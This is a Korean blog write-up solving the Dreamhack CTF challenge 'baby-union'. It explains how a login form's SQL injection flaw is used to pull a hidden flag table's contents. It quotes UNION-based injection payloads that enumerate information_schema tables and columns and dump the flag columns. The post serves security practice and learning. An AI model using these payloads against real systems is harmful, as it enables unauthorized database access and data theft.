---
title: (18) Dreamhack baby-union 문제 풀이
date: 2024-01-21 +09:00
categories:
  - 웹해킹
tags:
  - [웹해킹, 드림핵]
---
{% raw %}
## 문제 설명
로그인 시 계정의 정보가 출력되는 웹 서비스입니다.  
SQL INJECTION 취약점을 통해 플래그를 획득하세요. 문제에서 주어진 `init.sql` 파일의 테이블명과 컬럼명은 실제 이름과 다릅니다.  
플래그 형식은 `DH{...}` 입니다.

## 문제 풀이
먼저 `init.sql` 입니다.
```sql
CREATE DATABASE secret_db;
GRANT ALL PRIVILEGES ON secret_db.* TO 'dbuser'@'localhost' IDENTIFIED BY 'dbpass';

USE `secret_db`;
CREATE TABLE users (
  idx int auto_increment primary key,
  uid varchar(128) not null,
  upw varchar(128) not null,
  descr varchar(128) not null
);

INSERT INTO users (uid, upw, descr) values ('admin', 'apple', 'For admin');
INSERT INTO users (uid, upw, descr) values ('guest', 'melon', 'For guest');
INSERT INTO users (uid, upw, descr) values ('banana', 'test', 'For banana');
FLUSH PRIVILEGES;

CREATE TABLE fake_table_name (
  idx int auto_increment primary key,
  fake_col1 varchar(128) not null,
  fake_col2 varchar(128) not null,
  fake_col3 varchar(128) not null,
  fake_col4 varchar(128) not null
);

INSERT INTO fake_table_name (fake_col1, fake_col2, fake_col3, fake_col4) values ('flag is ', 'DH{sam','ple','flag}');
```
flag가 숨겨진 table에 있습니다.

`app.py`는 그냥 sql 요청을 보내고 데이터를 `user.html`에 보여주는 역할만 하므로 생략하겠습니다.
![](https://kyuyeop.github.io/assets/img/post/18/1.png)
사이트에 들어오면 이런 모습입니다. 일단 sqli가 되는지 부터 확인해야 합니다.
![](https://kyuyeop.github.io/assets/img/post/18/2.png)
이렇게 입력하면
![](https://kyuyeop.github.io/assets/img/post/18/3.png)
로그인이 됩니다. 이로써 sqli 취약점이 있다는 것을 알았습니다.  
  
이제 숨겨진 테이블명을 찾아야 합니다.
### information_schema
MYSQL에서 `information_schema`는 db에 관한 정보를 모아둔 db입니다.  
`information_schema.tables`를 이용해 모든 테이블에 관한 정보를 확인할 수 있습니다.  
`information_shema.columns`를 이용해 테이블에 존재하는 칼럼에 관한 정보를 확인할 수 있습니다.  
  
<br>
  
따라서 `union`을 이용해 `information_schema.tables`로 부터 `table_name`을 가져올 수 있도록 해 주었습니다. 앞선 sql의 반환 칼럼이 `idx, uid, upw, descr` 4개 이므로 필요없는 부분은 `null`로 채워줬습니다.  
```
' union select table_name,null,null,null from information_schema.tables #
```
이를 실행해보면 아래와 같이 모든 테이블의 이름이 출력됩니다.
![](https://kyuyeop.github.io/assets/img/post/18/4.png)
가장 아래에 딱 봐도 수상해 보이는 onlyflag라는 테이블이 존재함을 확인 할 수 있습니다.  
위에 있는것들은 시스템 상으로 관리되는 db들입니다. 생성 순서상 onlyflag 테이블에 flag가 있음을 알 수 있습니다.  
  
테이블 명을 알아냈으니 다음으로는 숨겨진 칼럼명을 알아야 합니다.  
아래와 같이 table_name='onlyflag'인 table로 부터 column_name을 가져왔습니다.
```
' union select column_name,null,null,null from information_schema.columns where table_name='onlyflag' #
```
이걸 입력하면 아래와 같이 onlyflag 테이블의 칼럼 이름들이 나옵니다.
![](https://kyuyeop.github.io/assets/img/post/18/5.png)
생성 순서로 보아 마지막 3개의 칼럼에 flag가 있음을 알 수 있습니다.  
  
이를 출력해야 하는데, 조심해야 할게 있습니다.
```html
{% extends "base.html" %}
{% block title %}user{% endblock %}

{% block head %}
  {{ super() }}
{% endblock %}

{% block content %}
    <h2>Hello {{ data[0][1] }}</h2><br/><br/>
    <table class="table table-striped table-sm"  style="margin-left: auto; margin-right: auto;">
        <thead>
          <tr>
            <th scope="col">#</th>
            <th scope="col">id</th>
            <th scope="col">description</th>
          </tr>
        </thead>
        <tbody>
          {% for i in data %}
          <tr>
            <th scope="row">{{ i[0] }}</th>
            <td>{{ i[1] }}</td>
            <td>{{ i[3] }}</td>
          </tr>
          {% endfor %}
        </tbody>
      </table>
{% endblock %}
```
이건 로그인에 성공한 경우 보여지는 페이지의 코드 입니다. 보시면 입력된 데이터의 0, 1, 3번 데이터를 출력해주고 있습니다. 따라서 여기에 맞춰줘야 전체 flag를 한번에 확인할 수 있습니다.
```
' union select svalue,sflag,null,sclose from onlyflag #
```
이렇게 순서를 맞춰주고 실행하면
![](https://kyuyeop.github.io/assets/img/post/18/6.png)
이렇게 조각난 flag를 얻을 수 있습니다.
{% endraw %}